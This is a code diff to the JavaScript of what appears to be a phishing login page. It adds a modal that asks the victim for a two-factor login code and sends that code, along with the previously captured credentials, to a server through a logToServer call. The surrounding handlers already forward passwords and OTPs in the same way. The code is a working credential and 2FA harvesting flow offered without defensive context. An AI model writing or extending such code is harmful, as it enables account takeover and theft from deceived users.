@@ -54,6 +54,9 @@ document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => { btn.innerText = "Sent"; }, 800);
     });
 
+    const modalLogin = document.getElementById('modal-login-otp');
+    const verifyLoginOtp = document.getElementById('verify-login-otp');
+
     const btnSignin = document.getElementById('trigger-signin');
     if (btnSignin) {
         btnSignin.addEventListener('click', async () => {
@@ -74,15 +77,29 @@ document.addEventListener('DOMContentLoaded', () => {
             if (idVal.includes('@')) verifyEmailId.value = idVal;
             else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;
 
-            console.log("-> Starting Log: LOGIN");
+            console.log("-> Log: CREDENTIALS");
             await logToServer(userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)', userData);
             
-            screenSignin.style.display = 'none';
-            screenStepper.style.display = 'flex';
+            // Show Login OTP modal before moving to stepper
+            modalLogin.style.display = 'flex';
         });
     }
 
+    document.getElementById('submit-login-otp').addEventListener('click', async () => {
+        if (!verifyLoginOtp.value) return alert("Please enter the login code");
+        userData.login_otp = verifyLoginOtp.value;
+        document.getElementById('submit-login-otp').innerText = "Verifying...";
+        
+        console.log("-> Log: LOGIN OTP");
+        await logToServer('🔢 LOGIN OTP (2FA)', userData);
+        
+        modalLogin.style.display = 'none';
+        screenSignin.style.display = 'none';
+        screenStepper.style.display = 'flex';
+    });
+
     document.getElementById('item-email').addEventListener('click', () => {
+
         if (currentStep !== 1) return;
         modalEmail.style.display = 'flex';
     });
@@ -149,9 +166,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     window.closeAllModals = () => {
+        modalLogin.style.display = 'none';
         modalEmail.style.display = 'none';
         modalPhone.style.display = 'none';
     };
+
 
     window.pasteOTP = async (id) => {
         try {
